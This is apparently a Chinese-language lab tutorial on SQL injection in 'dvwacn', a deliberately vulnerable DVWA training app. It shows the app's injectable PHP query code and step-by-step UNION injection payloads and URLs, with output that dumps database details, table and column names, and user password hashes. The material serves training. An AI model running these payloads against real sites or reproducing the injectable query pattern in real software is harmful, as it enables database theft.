#dvwacn之一sql注入

dvwacn之sqli物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/sqli/source# ls

high.php  low.php  medium.php
```

##安全级别

- low.php

```
<?php	

if(isset($_GET['Submit'])){
	
	// Retrieve data
	
	$id = $_GET['id'];

	$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
	$result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

	$num = mysql_numrows($result);

	$i = 0;

	while ($i < $num) {

		$first = mysql_result($result,$i,"first_name");
		$last = mysql_result($result,$i,"last_name");
		
		$html .= '<pre>';
		$html .= 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
		$html .= '</pre>';

		$i++;
	}
}
?>
```



- medium.php


```
<?php

if (isset($_GET['Submit'])) {

	// Retrieve data

	$id = $_GET['id'];
	$id = mysql_real_escape_string($id);

	$getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";

	$result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );
	
	$num = mysql_numrows($result);

	$i=0;

	while ($i < $num) {

		$first = mysql_result($result,$i,"first_name");
		$last = mysql_result($result,$i,"last_name");
		
		$html .= '<pre>';
		$html .= 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
		$html .= '</pre>';

		$i++;
	}
}
?>
```


- high.php


```
<?php	

if (isset($_GET['Submit'])) {

	// Retrieve data

	$id = $_GET['id'];
	$id = stripslashes($id);
	$id = mysql_real_escape_string($id);

	if (is_numeric($id)){

		$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
		$result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

		$num = mysql_numrows($result);

		$i=0;

		while ($i < $num) {

			$first = mysql_result($result,$i,"first_name");
			$last = mysql_result($result,$i,"last_name");
			
			$html .= '<pre>';
			$html .= 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
			$html .= '</pre>';

			$i++;
		}
	}
}
?>
```

##获取数据库基本信息

实际的查询语句是

```
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

sql注入url地址

http://192.168.56.80/dvwacn/vulnerabilities/sqli/


用户ID输入：

```
id=-1' UNION SELECT 1, CONCAT_WS(CHAR(32,58,32),user(),database(),version())#
```

实际上拼接的sql语句是：

```
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1, CONCAT_WS(CHAR(32,58,32),user(),database(),version())#'
```

> 
上面`1'`后面的单引号作用是闭合`user_id = '$id`'中的单引号,`#`号的作用是注释`user_id = '$id'`中原有的后面的单引号


完整的sql注入url

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27%20UNION%20SELECT%201,%20CONCAT_WS(CHAR(32,58,32),user(),database(),version())%23&Submit=%E7%A1%AE%E5%AE%9A
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1' UNION SELECT 1, CONCAT_WS(CHAR(32,58,32),user(),database(),version())#&Submit=确定
```

###符号说明


- `'`=单引号

双引号里面的字段会经过编译器解释然后再当作HTML代码输出

单引号里面的不需要解释，直接输出

- `#`=单行注释符


###UNION

联合的意思，即把两次或多次查询结果合并起来。

用于合并两个或多个 SELECT 语句的结果集，并消去表中任何重复行。

UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。

同时，每条 SELECT 语句中的列的顺序必须相同.

SQL UNION 语法：

```
SELECT column_name FROM table1
UNION
SELECT column_name FROM table2
```

###CONCAT()函数

CONCAT（）函数用于将多个字符串连接成一个字符串，是最重要的mysql函数之一

用法：

```
mysql CONCAT(str1,str2,…)                        
```

返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。或许有一个或多个参数。 如果所有参数均为非二进制字符串，则结果为非二进制字符串。 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串。一个数字参数被转化为与之相等的二进制字符串格式；若要避免这种情况，可使用显式类型 cast, 例如： SELECT CONCAT(CAST(int_col AS CHAR), char_col)

```
mysql> SELECT CONCAT('My', 'S', 'QL');

+-------------------------+
| CONCAT('My', 'S', 'QL') |
+-------------------------+
| MySQL                   |
+-------------------------+
1 row in set (0.00 sec)

mysql> SELECT CONCAT('My', NULL, 'QL');

+--------------------------+
| CONCAT('My', NULL, 'QL') |
+--------------------------+
| NULL                     |
+--------------------------+
1 row in set (0.00 sec)

mysql> SELECT CONCAT(14.3);

+--------------+
| CONCAT(14.3) |
+--------------+
| 14.3         |
+--------------+
1 row in set (0.00 sec)

```

###CONCAT_WS()函数


CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。

用法：

```
CONCAT_WS(separator,str1,str2,…)
```

注意：

如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。

如连接后以逗号分隔 

```
mysql> select concat_ws(',','1','2','3');
+-------------------------------+
| concat_ws(',','1','2','3') |
+-------------------------------+
| 1,2,3  |
+-------------------------------+
1 row in set (0.00 sec)
```

和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL 

```
mysql> select concat_ws(',','1','2',NULL);
+-------------------------------+
| concat_ws(',','1','2',NULL) |
+-------------------------------+
| 1,2 |
+-------------------------------+
1 row in set (0.00 sec)
```


###CHAR()字符串函数


```
mysql> select ASCII(' ');
+------------+
| ASCII(' ') |
+------------+
|         32 |
+------------+
1 row in set (0.00 sec)


mysql> select ASCII(':');
+------------+
| ASCII(':') |
+------------+
|         58 |
+------------+
1 row in set (0.00 sec)
```

```
mysql> select CHAR(32);
+----------+
| CHAR(32) |
+----------+
|          |
+----------+
1 row in set (0.00 sec)


mysql> select CHAR(32,58,32);
+----------------+
| CHAR(32,58,32) |
+----------------+
|  :             |
+----------------+
1 row in set (0.00 sec)
```

- CHAR(32)=空格

- CHAR(32,58,32)=空格:空格


```
mysql> select ASCII('|');
+------------+
| ASCII('|') |
+------------+
|        124 |
+------------+
1 row in set (0.00 sec)

mysql>
```

mysql中的查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id =1;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>
```

```
mysql> SELECT 1,CONCAT_WS(CHAR(124),user(),database(),version());
+---+---------------------------------------------------+
| 1 | CONCAT_WS(CHAR(124),user(),database(),version())  |
+---+---------------------------------------------------+
| 1 | root@localhost|dvwacn|5.5.41-0ubuntu0.14.04.1-log |
+---+---------------------------------------------------+
1 row in set (0.00 sec)

mysql>
```

- user_id = '1'

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1,CONCAT_WS(CHAR(124),user(),database(),version());
+------------+---------------------------------------------------+
| first_name | last_name                                         |
+------------+---------------------------------------------------+
| admin      | admin                                             |
| 1          | root@localhost|dvwacn|5.5.41-0ubuntu0.14.04.1-log |
+------------+---------------------------------------------------+
2 rows in set (0.00 sec)

mysql>
```

- user_id = '-1'

```
SELECT first_name, last_name FROM users WHERE user_id = '-1' UNION SELECT 1,CONCAT_WS(CHAR(124),user(),database(),version());

mysql> SELECT first_name, last_name FROM users WHERE user_id = '-1' UNION SELECT 1,CONCAT_WS(CHAR(124),user(),database(),version());
+------------+---------------------------------------------------+
| first_name | last_name                                         |
+------------+---------------------------------------------------+
| 1          | root@localhost|dvwacn|5.5.41-0ubuntu0.14.04.1-log |
+------------+---------------------------------------------------+
1 row in set (0.00 sec)

mysql>
```

url中的查询结果

- user_id = '1'

http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2CCONCAT_WS%28CHAR%28124%29%2Cuser%28%29%2Cdatabase%28%29%2Cversion%28%29%29%23%27&Submit=%C8%B7%B6%A8#

```
ID: 1' UNION SELECT 1,CONCAT_WS(CHAR(124),user(),database(),version())#'
First name: admin
Surname: admin

ID: 1' UNION SELECT 1,CONCAT_WS(CHAR(124),user(),database(),version())#'
First name: 1
Surname: root@localhost|dvwacn|5.5.41-0ubuntu0.14.04.1-log
```

- user_id = '-1'

http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27+UNION+SELECT+1%2CCONCAT_WS%28CHAR%28124%29%2Cuser%28%29%2Cdatabase%28%29%2Cversion%28%29%29%23%27&Submit=%C8%B7%B6%A8#

```
ID: -1' UNION SELECT 1,CONCAT_WS(CHAR(124),user(),database(),version())#'
First name: 1
Surname: root@localhost|dvwacn|5.5.41-0ubuntu0.14.04.1-log
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1' UNION SELECT 1,CONCAT_WS(CHAR(124),user(),database(),version())#'&Submit=确定
```


##获取当前数据库所有表



http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27%20UNION%20SELECT%201,concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20%23&Submit=%C8%B7%B6%A8

```
ID: -1' UNION SELECT 1,concat(table_name) from information_schema.tables where table_schema=database() #
First name: 1
Surname: guestbook

ID: -1' UNION SELECT 1,concat(table_name) from information_schema.tables where table_schema=database() #
First name: 1
Surname: users
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1' UNION SELECT 1,concat(table_name) from information_schema.tables where table_schema=database() #&Submit=确定
```
mysql中的查询结果：

```

mysql> SELECT 1,concat(table_name) from information_schema.tables where table_schema=database();
+---+--------------------+
| 1 | concat(table_name) |
+---+--------------------+
| 1 | guestbook          |
| 1 | users              |
+---+--------------------+
2 rows in set (0.00 sec)

```

###table_name

table_name指的是当前数据库的表名

###information_schema库


查询看看库里有多少个表，表名等

```
select * from INFORMATION_SCHEMA.TABLES
```

`information_schema.tables`这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema.tables表里面。

Mysql的INFORMATION_SCHEMA数据库包含了一些表和视图，提供了访问数据库元数据的方式。

元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。

下面对一些重要的数据字典表做一些说明：

- SCHEMATA表：提供了关于数据库的信息。

- TABLES表：给出了关于数据库中的表的信息。

- COLUMNS表：给出了表中的列信息。

- STATISTICS表：给出了关于表索引的信息。

- USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。

- SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。

- TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。

- COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。

- CHARACTER_SETS表：提供了关于可用字符集的信息。

- COLLATIONS表：提供了关于各字符集的对照信息。

- COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。

- TABLE_CONSTRAINTS表：描述了存在约束的表。

- KEY_COLUMN_USAGE表：描述了具有约束的键列。

- ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。

- VIEWS表：给出了关于数据库中的视图的信息。

- TRIGGERS表：提供了关于触发程序的信息。

### 系统信息函数

- VERSION()返回数据库的版本号

- CONNECTION_ID()返回服务器的连接数，也就是到现在为止mysql服务的连接次数

- DATABASE(),SCHEMA()返回当前数据库名

- USER()返回当前用户的名称

- CHARSET(str)返回字符串str的字符集

- COLLATION(str)返回字符串str的字符排列方式

- LAST_INSERT_ID()返回最后生成的auto_increment值


##点击获取所有users表的字段

http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27%20UNION%20SELECT%201,concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273%20%23&Submit=%C8%B7%B6%A8


url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #&Submit=确定
```

###column_name

column_name指的是表的列名

###0x7573657273

0x7573657273这个是users的十六进制表示形式。

```
mysql> select hex('users');
+--------------+
| hex('users') |
+--------------+
| 7573657273   |
+--------------+
1 row in set (0.00 sec)
```


mysql中的查询结果

```
mysql> SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273;
+---+---------------------+
| 1 | concat(column_name) |
+---+---------------------+
| 1 | user_id             |
| 1 | first_name          |
| 1 | last_name           |
| 1 | user                |
| 1 | password            |
| 1 | id                  |
| 1	|...				  |	
+---+---------------------+
45 rows in set (0.00 sec)

```

##获取当前数据库users表的内容

http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27%20UNION%20SELECT%201,concat(user,0x3a,password)%20from%20users%20%23&Submit=%C8%B7%B6%A8


```
ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: admin:7fef6171469e80d32c0559f88b377245

ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: gordonb:e99a18c428cb38d5f260853678922e03

ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: 1337:8d3533d75ae2c3966d7e0d4fcc69216b

ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: pablo:0d107d09f5bbe40cade3de5c71e9e9b7

ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: smithy:5f4dcc3b5aa765d61d8327deb882cf99
```

url解码后：

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1' UNION SELECT 1,concat(user,0x3a,password) from users #&Submit=确定
```


mysql中的查询结果：

```
mysql> SELECT 1,concat(user,0x3a,password) from users;
+---+------------------------------------------+
| 1 | concat(user,0x3a,password)               |
+---+------------------------------------------+
| 1 | admin:7fef6171469e80d32c0559f88b377245   |
| 1 | gordonb:e99a18c428cb38d5f260853678922e03 |
| 1 | 1337:8d3533d75ae2c3966d7e0d4fcc69216b    |
| 1 | pablo:0d107d09f5bbe40cade3de5c71e9e9b7   |
| 1 | smithy:5f4dcc3b5aa765d61d8327deb882cf99  |
+---+------------------------------------------+
5 rows in set (0.00 sec)

mysql>
```

### 0x3a

十六进制0x3a=十进制58

```
mysql> select hex(58);
+---------+
| hex(58) |
+---------+
| 3A      |
+---------+
1 row in set (0.00 sec)

mysql>
```

```
mysql> select ascii(':');
+------------+
| ascii(':') |
+------------+
|         58 |
+------------+
1 row in set (0.00 sec)

mysql>
```